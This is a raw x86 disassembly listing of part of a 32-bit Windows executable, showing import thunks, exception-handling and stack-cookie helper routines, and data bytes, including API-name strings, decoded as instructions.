  407945:	int3   
  407946:	jmp    DWORD PTR ds:0x40a108
  40794c:	int3   
  40794d:	int3   
  40794e:	int3   
  40794f:	int3   
  407950:	int3   
  407951:	int3   
  407952:	jmp    DWORD PTR ds:0x40a104
  407958:	int3   
  407959:	int3   
  40795a:	int3   
  40795b:	int3   
  40795c:	int3   
  40795d:	int3   
  40795e:	int3   
  40795f:	int3   
  407960:	push   0x4077c0
  407965:	push   DWORD PTR fs:0x0
  40796c:	mov    eax,DWORD PTR [esp+0x10]
  407970:	mov    DWORD PTR [esp+0x10],ebp
  407974:	lea    ebp,[esp+0x10]
  407978:	sub    esp,eax
  40797a:	push   ebx
  40797b:	push   esi
  40797c:	push   edi
  40797d:	mov    eax,ds:0x409004
  407982:	xor    DWORD PTR [ebp-0x4],eax
  407985:	xor    eax,ebp
  407987:	push   eax
  407988:	mov    DWORD PTR [ebp-0x18],esp
  40798b:	push   DWORD PTR [ebp-0x8]
  40798e:	mov    eax,DWORD PTR [ebp-0x4]
  407991:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407998:	mov    DWORD PTR [ebp-0x8],eax
  40799b:	lea    eax,[ebp-0x10]
  40799e:	mov    fs:0x0,eax
  4079a4:	ret    
  4079a5:	mov    ecx,DWORD PTR [ebp-0x10]
  4079a8:	mov    DWORD PTR fs:0x0,ecx
  4079af:	pop    ecx
  4079b0:	pop    edi
  4079b1:	pop    edi
  4079b2:	pop    esi
  4079b3:	pop    ebx
  4079b4:	mov    esp,ebp
  4079b6:	pop    ebp
  4079b7:	push   ecx
  4079b8:	ret    
  4079b9:	int3   
  4079ba:	int3   
  4079bb:	int3   
  4079bc:	int3   
  4079bd:	int3   
  4079be:	jmp    DWORD PTR ds:0x40a0f4
  4079c4:	int3   
  4079c5:	int3   
  4079c6:	int3   
  4079c7:	int3   
  4079c8:	int3   
  4079c9:	int3   
  4079ca:	int3   
  4079cb:	int3   
  4079cc:	int3   
  4079cd:	int3   
  4079ce:	int3   
  4079cf:	int3   
  4079d0:	mov    eax,0x40b008
  4079d5:	jmp    0x4079df
  4079da:	int3   
  4079db:	int3   
  4079dc:	int3   
  4079dd:	int3   
  4079de:	int3   
  4079df:	push   ecx
  4079e0:	push   edx
  4079e1:	push   eax
  4079e2:	push   0x407f1c
  4079e7:	call   0x406f03
  4079ec:	pop    edx
  4079ed:	pop    ecx
  4079ee:	jmp    eax
  4079f0:	int3   
  4079f1:	int3   
  4079f2:	int3   
  4079f3:	int3   
  4079f4:	int3   
  4079f5:	int3   
  4079f6:	int3   
  4079f7:	int3   
  4079f8:	int3   
  4079f9:	int3   
  4079fa:	int3   
  4079fb:	int3   
  4079fc:	int3   
  4079fd:	int3   
  4079fe:	int3   
  4079ff:	int3   
  407a00:	mov    eax,0x40b000
  407a05:	jmp    0x407a0f
  407a0a:	int3   
  407a0b:	int3   
  407a0c:	int3   
  407a0d:	int3   
  407a0e:	int3   
  407a0f:	push   ecx
  407a10:	push   edx
  407a11:	push   eax
  407a12:	push   0x407f3c
  407a17:	call   0x406f03
  407a1c:	pop    edx
  407a1d:	pop    ecx
  407a1e:	jmp    eax
  407a20:	int3   
  407a21:	int3   
  407a22:	int3   
  407a23:	int3   
  407a24:	int3   
  407a25:	int3   
  407a26:	int3   
  407a27:	int3   
  407a28:	int3   
  407a29:	int3   
  407a2a:	int3   
  407a2b:	int3   
  407a2c:	int3   
  407a2d:	int3   
  407a2e:	int3   
  407a2f:	int3   
  407a30:	jmp    DWORD PTR ds:0x40a03c
  407a36:	int3   
  407a37:	int3   
  407a38:	int3   
  407a39:	int3   
  407a3a:	int3   
  407a3b:	mov    ecx,DWORD PTR [ebp-0xc]
  407a3e:	mov    DWORD PTR fs:0x0,ecx
  407a45:	pop    ecx
  407a46:	pop    edi
  407a47:	pop    edi
  407a48:	pop    esi
  407a49:	pop    ebx
  407a4a:	mov    esp,ebp
  407a4c:	pop    ebp
  407a4d:	push   ecx
  407a4e:	ret    
  407a4f:	int3   
  407a50:	int3   
  407a51:	int3   
  407a52:	int3   
  407a53:	int3   
  407a54:	mov    ecx,DWORD PTR [ebp-0x10]
  407a57:	xor    ecx,ebp
  407a59:	call   0x407330
  407a5e:	jmp    0x407a3b
  407a63:	int3   
  407a64:	int3   
  407a65:	int3   
  407a66:	int3   
  407a67:	int3   
  407a68:	push   eax
  407a69:	push   DWORD PTR fs:0x0
  407a70:	lea    eax,[esp+0xc]
  407a74:	sub    esp,DWORD PTR [esp+0xc]
  407a78:	push   ebx
  407a79:	push   esi
  407a7a:	push   edi
  407a7b:	mov    DWORD PTR [eax],ebp
  407a7d:	mov    ebp,eax
  407a7f:	mov    eax,ds:0x409004
  407a84:	xor    eax,ebp
  407a86:	push   eax
  407a87:	mov    DWORD PTR [ebp-0x10],eax
  407a8a:	push   DWORD PTR [ebp-0x4]
  407a8d:	mov    DWORD PTR [ebp-0x4],0xffffffff
  407a94:	lea    eax,[ebp-0xc]
  407a97:	mov    fs:0x0,eax
  407a9d:	ret    
  407a9e:	int3   
  407a9f:	int3   
  407aa0:	int3   
  407aa1:	int3   
  407aa2:	int3   
  407aa3:	int3   
  407aa4:	jmp    DWORD PTR ds:0x40a0ec
  407aaa:	int3   
  407aab:	int3   
  407aac:	int3   
  407aad:	int3   
  407aae:	int3   
  407aaf:	int3   
  407ab0:	jmp    DWORD PTR ds:0x40a0f0
  407ab6:	int3   
  407ab7:	int3   
  407ab8:	int3   
  407ab9:	int3   
  407aba:	int3   
  407abb:	int3   
  407abc:	jmp    DWORD PTR ds:0x40a0e8
  407ac2:	int3   
  407ac3:	int3   
  407ac4:	int3   
  407ac5:	int3   
  407ac6:	int3   
  407ac7:	lea    ecx,[ebp-0x238]
  407acd:	jmp    0x405209
  407ad2:	lea    ecx,[ebp-0x234]
  407ad8:	jmp    0x405209
  407add:	mov    edx,DWORD PTR [esp+0x8]
  407ae1:	lea    eax,[edx+0xc]
  407ae4:	mov    ecx,DWORD PTR [edx-0x254]
  407aea:	xor    ecx,eax
  407aec:	call   0x407330
  407af1:	mov    ecx,DWORD PTR [edx-0x4]
  407af4:	xor    ecx,eax
  407af6:	call   0x407330
  407afb:	mov    eax,0x407ce8
  407b00:	jmp    0x407aa4
  407b05:	int3   
  407b06:	int3   
  407b07:	int3   
  407b08:	int3   
  407b09:	int3   
  407b0a:	lea    ecx,[ebp-0x48]
  407b0d:	jmp    0x405209
  407b12:	lea    ecx,[ebp-0x4c]
  407b15:	jmp    0x405209
  407b1a:	lea    ecx,[ebp-0x58]
  407b1d:	jmp    0x405209
  407b22:	lea    ecx,[ebp-0x64]
  407b25:	jmp    0x405209
  407b2a:	lea    ecx,[ebp-0x54]
  407b2d:	jmp    0x405209
  407b32:	lea    ecx,[ebp-0x28]
  407b35:	jmp    0x403efc
  407b3a:	lea    ecx,[ebp-0x28]
  407b3d:	jmp    0x403efc
  407b42:	lea    ecx,[ebp-0x28]
  407b45:	jmp    0x403efc
  407b4a:	lea    ecx,[ebp-0x28]
  407b4d:	jmp    0x403efc
  407b52:	lea    ecx,[ebp-0x28]
  407b55:	jmp    0x403efc
  407b5a:	lea    ecx,[ebp-0x28]
  407b5d:	jmp    0x403efc
  407b62:	lea    ecx,[ebp-0x28]
  407b65:	jmp    0x403efc
  407b6a:	lea    ecx,[ebp-0x40]
  407b6d:	jmp    0x403efc
  407b72:	lea    ecx,[ebp-0x28]
  407b75:	jmp    0x403efc
  407b7a:	lea    ecx,[ebp-0x40]
  407b7d:	jmp    0x403efc
  407b82:	lea    ecx,[ebp-0x28]
  407b85:	jmp    0x403efc
  407b8a:	mov    edx,DWORD PTR [esp+0x8]
  407b8e:	lea    eax,[edx+0xc]
  407b91:	mov    ecx,DWORD PTR [edx-0x70]
  407b94:	xor    ecx,eax
  407b96:	call   0x407330
  407b9b:	mov    ecx,DWORD PTR [edx-0x4]
  407b9e:	xor    ecx,eax
  407ba0:	call   0x407330
  407ba5:	mov    eax,0x407d0c
  407baa:	jmp    0x407aa4
  407baf:	int3   
  407bb0:	int3   
  407bb1:	int3   
  407bb2:	int3   
  407bb3:	int3   
  407bb4:	lea    ecx,[ebp-0x1c]
  407bb7:	jmp    0x405209
  407bbc:	lea    ecx,[ebp-0x14]
  407bbf:	jmp    0x405209
  407bc4:	lea    ecx,[ebp-0x18]
  407bc7:	jmp    0x405209
  407bcc:	lea    ecx,[ebp-0x24]
  407bcf:	jmp    0x405209
  407bd4:	mov    edx,DWORD PTR [esp+0x8]
  407bd8:	lea    eax,[edx+0xc]
  407bdb:	mov    ecx,DWORD PTR [edx-0x28]
  407bde:	xor    ecx,eax
  407be0:	call   0x407330
  407be5:	mov    ecx,DWORD PTR [edx-0x4]
  407be8:	xor    ecx,eax
  407bea:	call   0x407330
  407bef:	mov    eax,0x407dd0
  407bf4:	jmp    0x407aa4
  407bf9:	int3   
  407bfa:	int3   
  407bfb:	int3   
  407bfc:	int3   
  407bfd:	int3   
  407bfe:	lea    ecx,[ebp-0x30]
  407c01:	jmp    0x405209
  407c06:	lea    ecx,[ebp-0x2c]
  407c09:	jmp    0x405209
  407c0e:	lea    ecx,[ebp-0x34]
  407c11:	jmp    0x405209
  407c16:	lea    ecx,[ebp-0x28]
  407c19:	jmp    0x403efc
  407c1e:	mov    edx,DWORD PTR [esp+0x8]
  407c22:	lea    eax,[edx+0xc]
  407c25:	mov    ecx,DWORD PTR [edx-0x38]
  407c28:	xor    ecx,eax
  407c2a:	call   0x407330
  407c2f:	mov    ecx,DWORD PTR [edx-0x4]
  407c32:	xor    ecx,eax
  407c34:	call   0x407330
  407c39:	mov    eax,0x407e14
  407c3e:	jmp    0x407aa4
  407c43:	int3   
  407c44:	int3   
  407c45:	int3   
  407c46:	int3   
  407c47:	int3   
  407c48:	lea    ecx,[ebp-0x18]
  407c4b:	jmp    0x405209
  407c50:	lea    ecx,[ebp-0x14]
  407c53:	jmp    0x405209
  407c58:	lea    ecx,[ebp-0x1c]
  407c5b:	jmp    0x405209
  407c60:	mov    edx,DWORD PTR [esp+0x8]
  407c64:	lea    eax,[edx+0xc]
  407c67:	mov    ecx,DWORD PTR [edx-0x24]
  407c6a:	xor    ecx,eax
  407c6c:	call   0x407330
  407c71:	mov    ecx,DWORD PTR [edx-0x4]
  407c74:	xor    ecx,eax
  407c76:	call   0x407330
  407c7b:	mov    eax,0x407e50
  407c80:	jmp    0x407aa4
  407c85:	int3   
  407c86:	int3   
  407c87:	int3   
  407c88:	int3   
  407c89:	int3   
  407c8a:	int3   
  407c8b:	int3   
  407c8c:	int3   
  407c8d:	int3   
  407c8e:	int3   
  407c8f:	int3   
  407c90:	mov    ecx,DWORD PTR ds:0x4093a8
  407c96:	jmp    0x406126
  407c9b:	int3   
  407c9c:	int3   
  407c9d:	int3   
  407c9e:	int3   
  407c9f:	int3   
  407ca0:	mov    ecx,DWORD PTR ds:0x4093a4
  407ca6:	call   0x4057ce
  407cab:	and    DWORD PTR ds:0x4093a4,0x0
  407cb2:	ret    
  407cb3:	int3   
  407cb4:	int3   
  407cb5:	int3   
  407cb6:	int3   
  407cb7:	int3   
  407cb8:	int3   
  407cb9:	int3   
  407cba:	int3   
  407cbb:	int3   
  407cbc:	int3   
  407cbd:	int3   
  407cbe:	int3   
  407cbf:	int3   
  407cc0:	mov    ecx,DWORD PTR ds:0x4093a8
  407cc6:	call   0x406036
  407ccb:	and    DWORD PTR ds:0x4093a8,0x0
  407cd2:	ret    
  407cd3:	int3   
  407cd4:	int3   
  407cd5:	int3   
  407cd6:	int3   
  407cd7:	int3   
  407cd8:	(bad)  
  407cd9:	(bad)  
  407cda:	(bad)  
  407cdb:	inc    edi
  407cdd:	jp     0x407d1f
  407cdf:	add    BYTE PTR [eax],al
  407ce1:	add    BYTE PTR [eax],al
  407ce3:	add    dl,dl
  407ce5:	jp     0x407d27
  407ce7:	add    BYTE PTR [edx],ah
  407ce9:	add    eax,0x21993
  407cee:	add    BYTE PTR [eax],al
  407cf0:	fdivr  DWORD PTR [eax+eax*2+0x0]
	...
  407d08:	add    DWORD PTR [eax],eax
  407d0a:	add    BYTE PTR [eax],al
  407d0c:	and    al,BYTE PTR ds:0x101993
  407d12:	add    BYTE PTR [eax],al
  407d14:	xor    BYTE PTR [ebp+0x40],bh
	...
  407d2b:	add    BYTE PTR [ecx],al
  407d2d:	add    BYTE PTR [eax],al
  407d2f:	add    bh,bh
  407d31:	(bad)  
  407d32:	(bad)  
  407d33:	dec    DWORD PTR [edx]
  407d35:	jnp    0x407d77
  407d37:	add    BYTE PTR [eax],al
  407d39:	add    BYTE PTR [eax],al
  407d3b:	add    BYTE PTR [edx],dl
  407d3d:	jnp    0x407d7f
  407d3f:	add    BYTE PTR [ecx],al
  407d41:	add    BYTE PTR [eax],al
  407d43:	add    BYTE PTR [edx],bl
  407d45:	jnp    0x407d87
  407d47:	add    BYTE PTR [edx],al
  407d49:	add    BYTE PTR [eax],al
  407d4b:	add    BYTE PTR [edx],ah
  407d4d:	jnp    0x407d8f
  407d4f:	add    BYTE PTR [ebx],al
  407d51:	add    BYTE PTR [eax],al
  407d53:	add    BYTE PTR [edx],ch
  407d55:	jnp    0x407d97
  407d57:	add    BYTE PTR [eax+eax*1],al
  407d5a:	add    BYTE PTR [eax],al
  407d5c:	xor    bh,BYTE PTR [ebx+0x40]
  407d5f:	add    BYTE PTR [eax+eax*1],al
  407d62:	add    BYTE PTR [eax],al
  407d64:	cmp    bh,BYTE PTR [ebx+0x40]
  407d67:	add    BYTE PTR [eax+eax*1],al
  407d6a:	add    BYTE PTR [eax],al
  407d6c:	inc    edx
  407d6d:	jnp    0x407daf
  407d6f:	add    BYTE PTR [eax+eax*1],al
  407d72:	add    BYTE PTR [eax],al
  407d74:	dec    edx
  407d75:	jnp    0x407db7
  407d77:	add    BYTE PTR [eax+eax*1],al
  407d7a:	add    BYTE PTR [eax],al
  407d7c:	push   edx
  407d7d:	jnp    0x407dbf
  407d7f:	add    BYTE PTR [eax+eax*1],al
  407d82:	add    BYTE PTR [eax],al
  407d84:	pop    edx
  407d85:	jnp    0x407dc7
  407d87:	add    BYTE PTR [eax+eax*1],al
  407d8a:	add    BYTE PTR [eax],al
  407d8c:	bound  edi,QWORD PTR [ebx+0x40]
  407d8f:	add    BYTE PTR [eax+eax*1],al
  407d92:	add    BYTE PTR [eax],al
  407d94:	push   0x7b
  407d96:	inc    eax
  407d97:	add    BYTE PTR [eax+eax*1],cl
  407d9a:	add    BYTE PTR [eax],al
  407d9c:	jb     0x407e19
  407d9e:	inc    eax
  407d9f:	add    BYTE PTR [eax+eax*1],al
  407da2:	add    BYTE PTR [eax],al
  407da4:	jp     0x407e21
  407da6:	inc    eax
  407da7:	add    BYTE PTR [esi],cl
  407da9:	add    BYTE PTR [eax],al
  407dab:	add    BYTE PTR [edx-0xffbf85],al
  407db1:	(bad)  
  407db2:	(bad)  
  407db3:	push   DWORD PTR [ebx+edi*2+0x40]
  407dba:	add    BYTE PTR [eax],al
  407dbc:	mov    esp,0x100407b
  407dc1:	add    BYTE PTR [eax],al
  407dc3:	add    ah,al
  407dc5:	jnp    0x407e07
  407dc7:	add    BYTE PTR [edx],al
  407dc9:	add    BYTE PTR [eax],al
  407dcb:	add    ah,cl
  407dcd:	jnp    0x407e0f
  407dcf:	add    BYTE PTR [edx],ah
  407dd1:	add    eax,0x41993
  407dd6:	add    BYTE PTR [eax],al
  407dd8:	mov    al,0x7d
  407dda:	inc    eax
	...
  407def:	add    BYTE PTR [ecx],al
  407df1:	add    BYTE PTR [eax],al
  407df3:	add    bh,bh
  407df5:	(bad)  
  407df6:	(bad)  
  407df7:	(bad)  
  407df8:	(bad)  
  407df9:	jnp    0x407e3b
  407dfb:	add    BYTE PTR [eax],al
  407dfd:	add    BYTE PTR [eax],al
  407dff:	add    BYTE PTR [esi],al
  407e01:	jl     0x407e43
  407e03:	add    BYTE PTR [ecx],al
  407e05:	add    BYTE PTR [eax],al
  407e07:	add    BYTE PTR [esi],cl
  407e09:	jl     0x407e4b
  407e0b:	add    BYTE PTR [edx],al
  407e0d:	add    BYTE PTR [eax],al
  407e0f:	add    BYTE PTR [esi],dl
  407e11:	jl     0x407e53
  407e13:	add    BYTE PTR [edx],ah
  407e15:	add    eax,0x41993
  407e1a:	add    BYTE PTR [eax],al
  407e1c:	hlt    
  407e1d:	jge    0x407e5f
	...
  407e33:	add    BYTE PTR [ecx],al
  407e35:	add    BYTE PTR [eax],al
  407e37:	add    bh,bh
  407e39:	(bad)  
  407e3a:	(bad)  
  407e3b:	dec    DWORD PTR [eax+0x7c]
  407e3e:	inc    eax
  407e3f:	add    BYTE PTR [eax],al
  407e41:	add    BYTE PTR [eax],al
  407e43:	add    BYTE PTR [eax+0x7c],dl
  407e46:	inc    eax
  407e47:	add    BYTE PTR [ecx],al
  407e49:	add    BYTE PTR [eax],al
  407e4b:	add    BYTE PTR [eax+0x7c],bl
  407e4e:	inc    eax
  407e4f:	add    BYTE PTR [edx],ah
  407e51:	add    eax,0x31993
  407e56:	add    BYTE PTR [eax],al
  407e58:	cmp    BYTE PTR [esi+0x40],bh
	...
  407e6f:	add    BYTE PTR [ecx],al
  407e71:	add    BYTE PTR [eax],al
  407e73:	add    BYTE PTR [eax],al
  407e75:	add    BYTE PTR [eax],al
  407e77:	add    ah,ah
  407e79:	(bad)  
  407e7a:	(bad)  
  407e7b:	inc    DWORD PTR [eax]
  407e7d:	add    BYTE PTR [eax],al
  407e7f:	add    BYTE PTR [edi+edi*8+0xffff],al
  407e86:	add    BYTE PTR [eax],al
  407e88:	(bad)  
  407e89:	(bad)  
  407e8a:	(bad)  
  407e8b:	jmp    DWORD PTR [esi-0x55ffbf8e]
  407e91:	jb     0x407ed3
  407e93:	add    dh,bh
  407e95:	(bad)  
  407e96:	(bad)  
  407e97:	call   FWORD PTR [edx+0x72]
  407e9a:	inc    eax
  407e9b:	add    BYTE PTR [esi+0x72],ch
  407e9e:	inc    eax
  407e9f:	add    ah,ah
  407ea1:	(bad)  
  407ea2:	(bad)  
  407ea3:	inc    DWORD PTR [eax]
  407ea5:	add    BYTE PTR [eax],al
  407ea7:	add    al,cl
  407ea9:	(bad)  
  407eaa:	(bad)  
  407eab:	inc    DWORD PTR [eax]
  407ead:	add    BYTE PTR [eax],al
  407eaf:	add    dh,bh
  407eb1:	(bad)  
  407eb2:	(bad)  
  407eb3:	inc    DWORD PTR [eax]
  407eb5:	add    BYTE PTR [eax],al
  407eb7:	add    dl,dl
  407eb9:	jae    0x407efb
  407ebb:	add    BYTE PTR [eax],al
  407ebd:	add    BYTE PTR [eax],al
  407ebf:	add    dh,bh
  407ec1:	(bad)  
  407ec2:	(bad)  
  407ec3:	inc    DWORD PTR [eax]
  407ec5:	add    BYTE PTR [eax],al
  407ec7:	add    ah,dl
  407ec9:	(bad)  
  407eca:	(bad)  
  407ecb:	inc    DWORD PTR [eax]
  407ecd:	add    BYTE PTR [eax],al
  407ecf:	add    dh,bh
  407ed1:	(bad)  
  407ed2:	(bad)  
  407ed3:	(bad)  
  407ed4:	mov    esp,0xc0004074
  407ed9:	je     0x407f1b
  407edb:	add    BYTE PTR [eax],al
  407edd:	add    BYTE PTR [eax],al
  407edf:	add    dh,bh
  407ee1:	(bad)  
  407ee2:	(bad)  
  407ee3:	inc    DWORD PTR [eax]
  407ee5:	add    BYTE PTR [eax],al
  407ee7:	add    al,bl
  407ee9:	(bad)  
  407eea:	(bad)  
  407eeb:	inc    DWORD PTR [eax]
  407eed:	add    BYTE PTR [eax],al
  407eef:	add    dh,bh
  407ef1:	(bad)  
  407ef2:	(bad)  
  407ef3:	call   FWORD PTR [ebx]
  407ef5:	jbe    0x407f37
  407ef7:	add    BYTE PTR [esi],ch
  407ef9:	jbe    0x407f3b
  407efb:	add    BYTE PTR [ecx],al
  407efd:	add    BYTE PTR [eax],al
  407eff:	add    BYTE PTR [eax+0x40000010],ah
  407f05:	nop
  407f06:	add    BYTE PTR [eax],al
  407f08:	adc    BYTE PTR [eax+0x7f8c0000],dh
  407f0e:	add    BYTE PTR [eax],al
  407f10:	and    BYTE PTR [eax+0x0],al
  407f16:	add    BYTE PTR [eax],al
  407f18:	add    BYTE PTR [eax],al
  407f1a:	add    BYTE PTR [eax],al
  407f1c:	add    DWORD PTR [eax],eax
  407f1e:	add    BYTE PTR [eax],al
  407f20:	rcl    BYTE PTR [eax],0x0
  407f23:	add    BYTE PTR [ebx+edx*4-0x4ff80000],dl
  407f2a:	add    BYTE PTR [eax],al
  407f2c:	test   BYTE PTR [edi+0x0],bh
  407f2f:	add    BYTE PTR [eax+eax*4],dh
	...
  407f3a:	add    BYTE PTR [eax],al
  407f3c:	add    DWORD PTR [eax],eax
  407f3e:	add    BYTE PTR [eax],al
  407f40:	rcl    BYTE PTR [eax],1
  407f42:	add    BYTE PTR [eax],al
  407f44:	cwde   
  407f45:	xchg   ebx,eax
  407f46:	add    BYTE PTR [eax],al
  407f48:	add    BYTE PTR [eax+0x7f7c0000],dh
  407f4e:	add    BYTE PTR [eax],al
  407f50:	cmp    al,0x80
	...
  407f7a:	add    BYTE PTR [eax],al
  407f7c:	or     BYTE PTR [eax+0x0],al
  407f82:	add    BYTE PTR [eax],al
  407f84:	cli    
  407f85:	jg     0x407f87
  407f87:	add    BYTE PTR [eax],al
  407f89:	add    BYTE PTR [eax],al
  407f8b:	add    ah,ch
  407f8d:	jg     0x407f8f
  407f8f:	add    dh,dl
  407f91:	jg     0x407f93
  407f93:	add    BYTE PTR [edi+edi*2+0x7fa00000],bh
	...
  407fa2:	inc    edi
  407fa3:	gs je  0x407ffb
  407fa6:	jae    0x40800d
  407fa8:	jb     0x407ff9
  407faa:	bound  ebp,QWORD PTR [edx+0x65]
  407fad:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  407fb1:	outs   dx,WORD PTR ds:[esi]
  407fb3:	jb     0x408022
  407fb5:	popa   
  407fb6:	je     0x408021
  407fb8:	outs   dx,DWORD PTR ds:[esi]
  407fb9:	outs   dx,BYTE PTR ds:[esi]
  407fba:	push   edi
  407fbb:	add    BYTE PTR [eax],al
  407fbd:	add    BYTE PTR [edi+0x65],al
  407fc0:	je     0x408012
  407fc2:	jb     0x408033
  407fc4:	arpl   WORD PTR [ebp+0x73],sp
  407fc7:	jae    0x408020
  407fc9:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  407fd0:	popa   
  407fd1:	je     0x40803c
  407fd3:	outs   dx,DWORD PTR ds:[esi]
  407fd4:	outs   dx,BYTE PTR ds:[esi]
  407fd5:	add    BYTE PTR [eax],al
  407fd7:	add    BYTE PTR [ebx+0x6c],al
  407fda:	outs   dx,DWORD PTR ds:[esi]
  407fdb:	jae    0x408042
  407fdd:	push   edi
  407fde:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  407fe5:	popa   
  407fe6:	je     0x408051
  407fe8:	outs   dx,DWORD PTR ds:[esi]
  407fe9:	outs   dx,BYTE PTR ds:[esi]
  407fea:	add    BYTE PTR [eax],al
  407fec:	add    BYTE PTR [eax],al
  407fee:	dec    esp
  407fef:	outs   dx,DWORD PTR ds:[esi]
  407ff0:	popa   
  407ff1:	fs push ebx
  407ff3:	je     0x408067
  407ff5:	imul   ebp,DWORD PTR [esi+0x67],0x57
  407ffc:	push   eax
  407ffd:	popa   
  407ffe:	je     0x408068
  408000:	inc    ecx
  408001:	jo     0x408073
  408003:	outs   dx,BYTE PTR gs:[esi]
  408005:	fs push edi
  408007:	add    BYTE PTR [eax],al
  408009:	add    BYTE PTR [ebx+0x6f],al
  40800c:	ins    DWORD PTR es:[edi],dx
  40800d:	ins    DWORD PTR es:[edi],dx
  40800e:	popa   
  40800f:	outs   dx,BYTE PTR ds:[esi]
  408010:	fs dec esp
  408012:	imul   ebp,DWORD PTR [esi+0x65],0x72416f54
  408019:	addr16 jbe 0x408073
	...
